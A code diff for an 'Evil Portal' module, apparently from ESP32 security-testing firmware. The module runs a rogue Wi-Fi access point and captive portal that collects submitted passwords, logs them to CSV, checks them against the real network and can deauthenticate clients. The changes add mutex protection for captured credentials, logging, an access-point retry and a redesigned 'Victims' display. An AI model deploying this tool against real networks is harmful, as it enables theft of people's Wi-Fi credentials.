@@ -1,6 +1,8 @@
 #include "evil_portal.h"
 #include "core/config.h"
 #include "core/display.h"
+#include "core/i18n.h"
+#include "core/logging/nzlog.h"
 #include "core/mykeyboard.h"
 #include "core/sd_functions.h"
 #include "core/utils.h"
@@ -21,6 +23,7 @@ EvilPortal::EvilPortal(
     : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode),
       _backgroundMode(backgroundMode), _autoTemplateFile(templateFile), webServer(80), _launchTime(millis()) {
     dnsServer = &sharedEvilPortalDnsServer();
+    lastCredMutex = xSemaphoreCreateMutex();
 
     _originalWifiMode = WiFi.getMode();
     _wifiWasConnected = WiFi.isConnected();
@@ -31,7 +34,38 @@ EvilPortal::EvilPortal(
     if (!_backgroundMode) { loop(); }
 }
 
-EvilPortal::~EvilPortal() {}
+EvilPortal::~EvilPortal() {
+    if (lastCredMutex != nullptr) {
+        vSemaphoreDelete(lastCredMutex);
+        lastCredMutex = nullptr;
+    }
+}
+
+void EvilPortal::setLastCred(const String &value) {
+    if (lastCredMutex == nullptr) {
+        lastCred = value;
+        return;
+    }
+    if (xSemaphoreTake(lastCredMutex, pdMS_TO_TICKS(250)) == pdTRUE) {
+        lastCred = value;
+        xSemaphoreGive(lastCredMutex);
+    }
+}
+
+String EvilPortal::takeLastCred() {
+    String value;
+    if (lastCredMutex == nullptr) {
+        value = lastCred;
+        lastCred = "";
+        return value;
+    }
+    if (xSemaphoreTake(lastCredMutex, pdMS_TO_TICKS(250)) == pdTRUE) {
+        value = lastCred;
+        lastCred = "";
+        xSemaphoreGive(lastCredMutex);
+    }
+    return value;
+}
 
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
     AsyncResponseStream *response = request->beginResponseStream("text/html");
@@ -131,12 +165,24 @@ void EvilPortal::beginAP() {
     else WiFi.mode(WIFI_MODE_AP);
 
     if (!WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0))) {
-        Serial.println("[PORTAL] softAPConfig failed");
+        NZLOGW("PORTAL", "softAPConfig failed");
     }
-    if (!WiFi.softAP(apName, emptyString, _channel)) {
-        Serial.printf("[PORTAL] softAP failed for SSID '%s' on ch%d\n", apName.c_str(), _channel);
+    bool apOk = WiFi.softAP(apName, emptyString, _channel);
+    if (!apOk) {
+        NZLOGE("PORTAL", "softAP failed for '%s' on ch%d; retrying", apName.c_str(), _channel);
+        WiFi.mode(WIFI_OFF);
+        vTaskDelay(pdMS_TO_TICKS(150));
+        WiFi.mode(_verifyPwd ? WIFI_MODE_APSTA : WIFI_MODE_AP);
+        vTaskDelay(pdMS_TO_TICKS(100));
+        apOk = WiFi.softAP(apName, emptyString, _channel);
+    }
+    if (!apOk) {
+        displayError("Evil Portal AP start failed", true);
+        wifiConnected = false;
+        return;
     }
     wifiConnected = true;
+    NZLOGI("PORTAL", "AP '%s' up on ch%d", apName.c_str(), _channel);
 
     int tmp = millis();
     while (millis() - tmp < 3000) yield();
@@ -385,7 +431,15 @@ void EvilPortal::processRequests() {
 
 bool EvilPortal::hasCredentials() { return totalCapturedCredentials > 0; }
 
-String EvilPortal::getCapturedPassword() { return lastCred; }
+String EvilPortal::getCapturedPassword() {
+    String value;
+    if (lastCredMutex == nullptr) { return lastCred; }
+    if (xSemaphoreTake(lastCredMutex, pdMS_TO_TICKS(250)) == pdTRUE) {
+        value = lastCred;
+        xSemaphoreGive(lastCredMutex);
+    }
+    return value;
+}
 
 String EvilPortal::getCapturedSSID() { return apName; }
 
@@ -428,57 +482,78 @@ void EvilPortal::checkAndExtendDuration() {
 void EvilPortal::drawScreen() {
     drawMainBorderWithTitle("EVIL PORTAL");
 
-    String subtitle = "AP: " + apName.substring(0, 30);
-    if (apName.length() > 30) subtitle += "...";
-    printSubtitle(subtitle);
+    bool compact = (tftHeight < 160);
+    int cardX = compact ? 8 : 12;
+    int cardY = BORDER_PAD_Y + 22;
+    int cardW = tftWidth - 2 * cardX;
+    int cardH = tftHeight - cardY - (compact ? 16 : 20);
+    uint16_t surf = uiSurfaceColor();
+    uint16_t bright = uiTextBrightColor();
+    int x = cardX + 8;
+    int w = cardW - 16;
+    int y = cardY + (compact ? 6 : 10);
+    int rowH = compact ? 12 : 16;
+
+    uiDrawCard(cardX, cardY, cardW, cardH, true);
+
+    // Header row: SSID + ACTIVE badge
+    int16_t badgeW = bruce_i18n::utf8PixelWidth("ACTIVE", FP) + 12;
+    uiDrawBadge(x + w - badgeW, y, "ACTIVE", TFT_DARKGREEN, 14);
+    tft.setTextDatum(TL_DATUM);
+    tft.setTextSize(FP);
+    tft.setTextColor(bright, surf);
+    tft.drawString(bruce_i18n::utf8TruncateToWidth("AP: " + apName, w - badgeW - 6, FP), x, y + 2, 1);
+    y += 17;
+    tft.drawFastHLine(x, y - 2, w, uiBorderDimColor());
+    y += 3;
 
     String apIp = WiFi.softAPIP().toString();
-    padprintln("");
-    if (bruceConfig.evilPortalEndpoints.showEndpoints) {
-        if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
-            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.getCredsEndpoint + " -> get creds");
-        } else {
-            padprintln("-> cred access disabled");
-        }
-        if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
-            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
-        } else {
-            padprintln("-> SSID change disabled");
-        }
-    } else {
-        padprintln("Endpoints hidden");
-    }
-    padprintln("");
+    uiDrawKeyValueRow(x, y, w, "Gateway", apIp, bruceConfig.priColor, surf);
+    y += rowH;
 
-    padprintln("Captive Portal: ACTIVE");
-    padprintln("Notifications: ENABLED");
-
-    if (!_verifyPwd) {
-        padprint("Victims: " + String(totalCapturedCredentials));
-    } else {
-        padprint("Attempt: " + String(totalCapturedCredentials));
-    }
     String passMode = "";
     switch (bruceConfig.evilPortalPasswordMode) {
         case FULL_PASSWORD: passMode = "Full"; break;
         case FIRST_LAST_CHAR: passMode = "p******d"; break;
         case HIDE_PASSWORD: passMode = "*hidden*"; break;
-        case SAVE_LENGTH: passMode = "Length only"; break;
+        case SAVE_LENGTH: passMode = "Length"; break;
     }
-    padprintln("Pwd mode: " + passMode);
-    printLastCapturedCredential();
+    uiDrawKeyValueRow(
+        x, y, w, _verifyPwd ? "Attempt" : "Victims", String(totalCapturedCredentials) + "  (" + passMode + ")",
+        bruceConfig.secColor, surf
+    );
+    y += rowH;
+
+    if (bruceConfig.evilPortalEndpoints.showEndpoints && y + rowH <= cardY + cardH - 6) {
+        String ep = bruceConfig.evilPortalEndpoints.allowGetCreds ? bruceConfig.evilPortalEndpoints.getCredsEndpoint
+                                                                  : "disabled";
+        uiDrawKeyValueRow(x, y, w, "Creds URL", ep, uiTextMutedColor(), surf);
+        y += rowH;
+    }
+
+    if (lastCred.length() && y + LH <= cardY + cardH - 4) {
+        tft.drawFastHLine(x, y - 1, w, uiBorderDimColor());
+        y += 2;
+        tft.setTextColor(bright, surf);
+        tft.setCursor(x, y);
+        printLastCapturedCredential();
+    }
+
     printDeauthStatus();
 }
 
 void EvilPortal::printLastCapturedCredential() {
-    while (lastCred.length()) {
-        int newlineIndex = lastCred.indexOf('\n');
+    // Take a private copy under the mutex; rendering can take many
+    // milliseconds and must not block the web server's credential handler.
+    String pending = takeLastCred();
+    while (pending.length()) {
+        int newlineIndex = pending.indexOf('\n');
         if (newlineIndex > -1) {
-            padprintln(lastCred.substring(0, newlineIndex));
-            lastCred.remove(0, newlineIndex + 1);
+            padprintln(pending.substring(0, newlineIndex));
+            pending.remove(0, newlineIndex + 1);
         } else {
-            padprint(lastCred);
-            lastCred = "";
+            padprint(pending);
+            pending = "";
         }
     }
 }
@@ -494,7 +569,10 @@ void EvilPortal::printDeauthStatus() {
 }
 
 void EvilPortal::loadCustomHtml() {
-    getFsStorage(fsHtmlFile);
+    if (!getFsStorage(fsHtmlFile) || fsHtmlFile == nullptr) {
+        displayError("No storage available", true);
+        return;
+    }
     htmlFileName = loopSD(*fsHtmlFile, true, "HTML", "/");
     String fileBaseName =
         htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
@@ -676,7 +754,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
     String passwordValue = "";
     String csvLine = "";
     String key;
-    lastCred = "";
+    String pendingCred = "";
 
     for (int i = 0; i < request->args(); i++) {
         key = request->argName(i);
@@ -708,7 +786,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
         if (i > 0) { csvLine += ","; }
 
         csvLine += key + ": " + valueBuffer;
-        lastCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
+        pendingCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
     }
 
     htmlResponse += "</li>\n";
@@ -717,7 +795,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
         request->send(200, "text/html", wifiLoadPage());
         bool isCorrect = verifyCreds(apName, passwordValue);
         if (isCorrect) {
-            lastCred += "valid: true\nStopping server...";
+            pendingCred += "valid: true\nStopping server...";
             saveToCSV(csvLine + ", valid: true", true);
             printDeauthStatus();
             if (bruceConfig.getWifiPassword(apName) != "") {
@@ -727,7 +805,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             verifyPass = true;
             _deauth = false;
         } else {
-            lastCred += "valid: false";
+            pendingCred += "valid: false";
             saveToCSV(csvLine + ", valid: false", true);
             portalController(request);
         }
@@ -736,6 +814,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
         request->send(200, "text/html", wifiLoadPage());
     }
 
+    setLastCred(pendingCred);
     capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
     totalCapturedCredentials++;
 }
